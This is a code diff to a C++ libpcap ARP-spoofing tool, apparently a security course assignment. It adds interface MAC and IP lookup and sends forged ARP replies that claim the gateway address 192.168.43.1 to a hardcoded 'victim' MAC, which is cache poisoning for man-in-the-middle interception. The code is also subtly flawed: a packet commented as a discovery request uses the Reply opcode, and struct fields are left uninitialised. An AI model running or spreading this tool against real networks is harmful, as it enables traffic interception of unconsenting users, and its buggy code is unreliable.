@@ -1,6 +1,8 @@
 #include <cstdio>
 #include <pcap.h>
 #include <stdlib.h>
+#include <ifaddrs.h>
+#include <linux/if_packet.h>
 #include "header/ethhdr.h"
 #include "header/arphdr.h"
 
@@ -16,52 +18,47 @@ void usage() {
 	printf("sample: send-arp-test wlan0\n");
 }
 
-char* getMacAddress(const char* interface) {
-    char command[128];
-    snprintf(command, sizeof(command), "ip link show %s", interface);
-    char* result = (char*)malloc(4096); // 충분히 큰 메모리 할당
-    if (!result) {
-        fprintf(stderr, "Memory allocation failed\n");
+typedef struct {
+    char* macAddress;
+    char* ipAddress;
+} NetworkAddresses;
+
+NetworkAddresses* getUserAddresses(const char* interface) {
+    struct ifaddrs *ifaddr, *ifa;
+    int family, s;
+    char host[NI_MAXHOST];
+    NetworkAddresses* addresses = (NetworkAddresses*)malloc(sizeof(NetworkAddresses));
+
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
         exit(EXIT_FAILURE);
     }
-    result[0] = '\0'; // 문자열 초기화
 
-    FILE* pipe = popen(command, "r");
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL)
+            continue;  
 
-    if (!pipe) {
-        fprintf(stderr, "Failed to run command %s\n", command);
-        free(result);
-        exit(EXIT_FAILURE);
-    }
+        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
 
-    char buffer[128];
-    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
-        strcat(result, buffer);
-    }
-
-    pclose(pipe);
-
-    // MAC 주소 추출
-    char* macStart = strstr(result, "link/ether");
-    if (macStart) {
-        macStart += 11; // "link/ether" 뒤에 MAC 주소가 위치합니다.
-        char* macAddress = (char*)malloc(18); // MAC 주소 + NULL 종료 문자를 위한 공간
-        if (!macAddress) {
-            fprintf(stderr, "Memory allocation failed\n");
-            free(result);
-            exit(EXIT_FAILURE);
+        if((strcmp(ifa->ifa_name,interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET)) {
+            if (s != 0) {
+                printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                exit(EXIT_FAILURE);
+            }
+            addresses->ipAddress = strdup(host);
         }
-        strncpy(macAddress, macStart, 17);
-        macAddress[17] = '\0'; // NULL 종료 문자 추가
 
-        free(result); // 원래의 result 문자열 메모리 해제
-        return macAddress; // MAC 주소 문자열 반환
-    } else {
-        free(result);
-        return NULL; // MAC 주소를 찾지 못한 경우
+        if ((strcmp(ifa->ifa_name, interface) == 0)&&(ifa->ifa_addr->sa_family == AF_PACKET)) {
+            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
+            asprintf(&addresses->macAddress, "%02x:%02x:%02x:%02x:%02x:%02x",
+                     (int)s->sll_addr[0], (int)s->sll_addr[1], (int)s->sll_addr[2], 
+                     (int)s->sll_addr[3], (int)s->sll_addr[4], (int)s->sll_addr[5]);
+        }
     }
-}
 
+    freeifaddrs(ifaddr);
+    return addresses;
+}
 
 int main(int argc, char* argv[]) {
 	if (argc % 2  != 0) {
@@ -80,15 +77,48 @@ int main(int argc, char* argv[]) {
 		}
 
 		// find my mac address
-		char* macAddress = getMacAddress(dev);
-		printf("%s", macAddress);
+		NetworkAddresses* addresses = getUserAddresses(dev);
+		
+		if(addresses->macAddress == nullptr){
+			fprintf(stderr, "couldn't find your mac address\n");
+			return -1;
+		}
 
+		if(addresses->ipAddress == nullptr){
+			fprintf(stderr, "couldn't find your IP address\n");
+			return -1;
+		}
+
+		printf("%s\n",addresses->macAddress);
+		printf("%s\n",addresses->ipAddress);
+		
+		// set sender and
 		char* sender_ip = argv[i + 1]; // victim
 		char* target_ip = argv[i + 2]; // gateway
 
 		EthArpPacket packet;
 
-		//request
+		// get sender's mac address
+		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+		packet.eth_.smac_ = Mac(addresses->macAddress);
+		packet.eth_.type_ = htons(EthHdr::Arp);
+
+		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+		packet.arp_.pro_ = htons(EthHdr::Ip4);
+		packet.arp_.hln_ = Mac::SIZE;
+		packet.arp_.pln_ = Ip::SIZE;
+		packet.arp_.op_ = htons(ArpHdr::Reply);
+		packet.arp_.smac_ = Mac(addresses->macAddress);
+		packet.arp_.sip_ = htonl(Ip(addresses->ipAddress));
+		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+		packet.arp_.tip_ = htonl(Ip(sender_ip));
+
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		}
+
+		//reply
 		packet.eth_.dmac_ = Mac("f4:6a:dd:8b:3e:77");
 		packet.eth_.smac_ = Mac("00:0c:29:bb:e4:89");
 		packet.eth_.type_ = htons(EthHdr::Arp);
@@ -97,7 +127,7 @@ int main(int argc, char* argv[]) {
 		packet.arp_.pro_ = htons(EthHdr::Ip4);
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
-		packet.arp_.op_ = htons(ArpHdr::Request);
+		packet.arp_.op_ = htons(ArpHdr::Reply);
 		packet.arp_.smac_ = Mac("00:0c:29:bb:e4:89");
 		packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
 		packet.arp_.tmac_ = Mac("f4:6a:dd:8b:3e:77");
